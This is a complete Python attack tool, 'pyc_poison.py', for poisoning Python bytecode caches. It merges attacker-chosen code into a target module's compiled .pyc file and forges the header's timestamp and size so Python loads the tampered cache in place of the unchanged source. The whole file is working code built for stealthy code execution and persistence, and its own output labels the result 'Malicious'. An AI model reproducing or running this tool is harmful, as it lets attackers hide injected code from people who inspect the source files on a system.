#!/usr/bin/env python3
"""Python .pyc Cache Poisoning — source merge.

Usage: ./pyc_poison.py <target.pyc> <original.py> <new.py>

Rebuilds <target.pyc> from <original.py> merged with <new.py>, then patches
the cache's header (magic, mtime, source size) so it matches the on-disk
<original.py>. Python therefore accepts it as a valid cache.
"""

import argparse
import importlib.util
import os
import py_compile
import re
import shutil
import struct
import subprocess
import sys
import tempfile
import tokenize

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except (AttributeError, ValueError):
    pass

# ─── Colors ──────────────────────────────────────────────────────────────────
RED = "\033[0;31m"
GREEN = "\033[0;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[0;34m"
NC = "\033[0m"


def banner():
    print()
    print(f"""{YELLOW}  ╔══════════════════════════════════════════════════════════════════════╗{NC}
{BLUE}  ██████╗ ██╗   ██╗ ██████╗ ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗{NC}
{BLUE}  ██╔══██╗╚██╗ ██╔╝██╔════╝ ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║{NC}
{BLUE}  ██████╔╝ ╚████╔╝ ██║      ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║{NC}
{BLUE}  ██╔═══╝   ╚██╔╝  ██║      ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║{NC}
{BLUE}  ██║        ██║   ╚██████╗ ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║{NC}
{BLUE}  ╚═╝        ╚═╝    ╚═════╝ ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝{NC}
{YELLOW}  ║          Python Cache Poisoning  |  Source Merge                      ║{NC}
{YELLOW}  ╚══════════════════════════════════════════════════════════════════════╝{NC}
""")


def die(msg, code=1):
    print(f"{RED}[-]{NC} {msg}")
    sys.exit(code)


def get_file_size(path):
    try:
        return os.stat(path).st_size
    except OSError:
        return 0


# ─── Source merge ────────────────────────────────────────────────────────────

def read_source(path):
    """Read a Python source file honoring its PEP 263 coding cookie."""
    with tokenize.open(path) as f:
        return f.read()


def build_combined_source(original_py, new_py):
    """Concatenate original.py with new.py at module level.

    Names defined in new.py land in the same module namespace as the
    original; later definitions shadow earlier ones, so new.py can override
    functions/classes from the original while everything else stays intact.
    `if __name__ == '__main__'` blocks in either file are inert at import
    time.

    A utf-8 coding cookie is prepended so the combined text is read
    consistently, regardless of any cookie in the original file. Note that
    `from __future__ import ...` in new.py would raise SyntaxError (future
    imports must be near the top of the module).
    """
    original = read_source(original_py)
    new = read_source(new_py)

    return (
            "# -*- coding: utf-8 -*-\n"
            + original.rstrip("\n")
            + "\n\n"
            + f"# --- merged from {os.path.basename(new_py)} ---\n"
            + new.rstrip("\n")
            + "\n"
    )


# ─── .pyc plumbing (unchanged from original tool) ───────────────────────────

def read_target_header(tgt_path):
    """Read & sanity-check the target's 16-byte .pyc header.

    Aborts (die) if the header is truncated or uses hash-based invalidation
    (PEP 552, flags bit 0), where timestamp/size patching has no effect.
    """
    with open(tgt_path, "rb") as f:
        header = f.read(16)
    if len(header) < 16:
        die(f"Target .pyc header too short ({len(header)} bytes)")

    flags = struct.unpack_from("<I", header, 4)[0]
    if flags & 0b01:
        die("Target .pyc uses HASH-based invalidation (PEP 552); "
            "timestamp/size patching will not work against this cache.")
    return header


def version_from_pyc_name(path):
    """Extract Python version from 'name.cpython-XYZ.pyc' -> 'X.Y'."""
    m = re.search(r"cpython-(\d)(\d+)", os.path.basename(path))
    return f"{m.group(1)}.{m.group(2)}" if m else None


def interpreter_magic(executable):
    """Return the 4-byte .pyc magic of a Python executable, or None."""
    try:
        result = subprocess.run(
            [executable, "-c",
             "import importlib.util,sys;"
             "sys.stdout.buffer.write(importlib.util.MAGIC_NUMBER)"],
            capture_output=True, timeout=10,
        )
    except (OSError, subprocess.SubprocessError):
        return None
    magic = result.stdout[:4]
    return magic if len(magic) == 4 else None


def find_matching_interpreter(target_magic, version_hint):
    """Find a Python interpreter whose .pyc magic equals target_magic.

    Returns (executable, is_current). is_current is True when the interpreter
    running this script already matches (so we can compile in-process).
    """
    if importlib.util.MAGIC_NUMBER == target_magic:
        return sys.executable, True

    candidates = []
    if version_hint:
        candidates.append(f"python{version_hint}")
    candidates += [f"python3.{minor}" for minor in range(15, 5, -1)]
    candidates += ["python3", "python"]

    seen = set()
    for exe in candidates:
        if exe in seen:
            continue
        seen.add(exe)
        if interpreter_magic(exe) == target_magic:
            return exe, False
    return None, False


def compile_pyc(interpreter, is_current, src, out):
    """Compile src -> out, in-process when the interpreter matches."""
    if is_current:
        try:
            py_compile.compile(src, cfile=out, doraise=True)
            return True
        except py_compile.PyCompileError as exc:
            print(f"{RED}[-]{NC} {exc}")
            return False

    result = subprocess.run(
        [interpreter, "-c",
         "import py_compile,sys;"
         "py_compile.compile(sys.argv[1], cfile=sys.argv[2], doraise=True)",
         src, out],
        capture_output=True, text=True,
    )
    if result.returncode != 0:
        print(f"{RED}[-]{NC} {result.stderr.strip()}")
        return False
    return True


def patch_pyc_header(mal_path, target_header, orig_py):
    """Patch the compiled cache's mtime+size to match the original .py on
    disk, which is what Python checks at import time for timestamp caches."""
    with open(mal_path, "r+b") as f:
        mal_header = bytearray(f.read(16))

        if mal_header[0:4] != target_header[0:4]:
            die("Compiled magic does not match target after interpreter "
                f"selection (target={target_header[0:4].hex()}, "
                f"compiled={mal_header[0:4].hex()})")

        orig_mtime = int(os.stat(orig_py).st_mtime)
        orig_size = os.stat(orig_py).st_size
        struct.pack_into("<I", mal_header, 8, orig_mtime & 0xFFFFFFFF)
        struct.pack_into("<I", mal_header, 12, orig_size & 0xFFFFFFFF)

        f.seek(0)
        f.write(mal_header)

    print(f"{GREEN}[+]{NC} Header patched: mtime={orig_mtime}, size={orig_size}")


def read_header_hex(path):
    with open(path, "rb") as f:
        return f.read(16).hex()


# ─── Orchestration ──────────────────────────────────────────────────────────

def merge_into_pyc(target_pyc, original_py, new_py):
    print(f"{BLUE}[*]{NC} Original source size: {get_file_size(original_py)} bytes")
    print(f"{BLUE}[*]{NC} New source size     : {get_file_size(new_py)} bytes")

    target_header = read_target_header(target_pyc)
    target_magic = bytes(target_header[0:4])
    version_hint = version_from_pyc_name(target_pyc)

    print(f"{BLUE}[*]{NC} Matching interpreter to target magic "
          f"({target_magic.hex()})...")
    interpreter, is_current = find_matching_interpreter(target_magic, version_hint)
    if interpreter is None:
        hint = f" (target built with Python {version_hint})" if version_hint else ""
        die(f"No installed Python matches the target .pyc magic{hint}. "
            "Install that version and re-run.")
    label = f"{interpreter} (this interpreter)" if is_current else interpreter
    print(f"{GREEN}[+]{NC} Using interpreter: {label}")

    with tempfile.TemporaryDirectory() as tmpdir:
        combined_py = os.path.join(tmpdir, "combined.py")
        compiled_pyc = os.path.join(tmpdir, "combined.pyc")

        print(f"{BLUE}[*]{NC} Building combined source...")
        with open(combined_py, "w", encoding="utf-8") as f:
            f.write(build_combined_source(original_py, new_py))

        print(f"{BLUE}[*]{NC} Compiling combined .pyc...")
        if not compile_pyc(interpreter, is_current, combined_py, compiled_pyc):
            die("Compilation failed")
        if not os.path.isfile(compiled_pyc):
            die("Compilation failed — no .pyc generated")

        print(f"{BLUE}[*]{NC} Patching .pyc header...")
        patch_pyc_header(compiled_pyc, target_header, original_py)

        print(f"{BLUE}[*]{NC} Verifying headers...")
        print(f"    Target   : {read_header_hex(target_pyc)}")
        print(f"    Malicious: {read_header_hex(compiled_pyc)}")

        # Preserve a clean backup; never clobber it on re-runs.
        backup = target_pyc + ".bak"
        if os.path.exists(backup):
            print(f"{YELLOW}[!]{NC} Backup already exists, keeping it: {backup}")
        else:
            shutil.copy(target_pyc, backup)
            print(f"{GREEN}[+]{NC} Backup: {backup}")

        shutil.copy(compiled_pyc, target_pyc)
        print(f"{GREEN}[+]{NC} Wrote merged .pyc to: {target_pyc}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Rebuild a .pyc from original.py merged with new.py, "
                    "keeping the cache header consistent with original.py.",
    )
    parser.add_argument("target_pyc", help="Path to the .pyc to overwrite")
    parser.add_argument("original_py", help="Path to the original .py source")
    parser.add_argument("new_py", help="Path to the .py source to merge in")
    return parser.parse_args()


def main():
    banner()
    args = parse_args()

    for label, path in (("target .pyc", args.target_pyc),
                        ("original .py", args.original_py),
                        ("new .py", args.new_py)):
        if not os.path.isfile(path):
            die(f"{label} not found: {path}")
    if not os.access(args.target_pyc, os.W_OK):
        die(f"No write permission: {args.target_pyc}")

    print(f"{BLUE}[*]{NC} Target .pyc  : {args.target_pyc}")
    print(f"{BLUE}[*]{NC} Original .py : {args.original_py}")
    print(f"{BLUE}[*]{NC} Merge    .py : {args.new_py}\n")

    merge_into_pyc(args.target_pyc, args.original_py, args.new_py)
    print(f"\n{GREEN}[+]{NC} Done — merged cache is in place.")


if __name__ == "__main__":
    main()
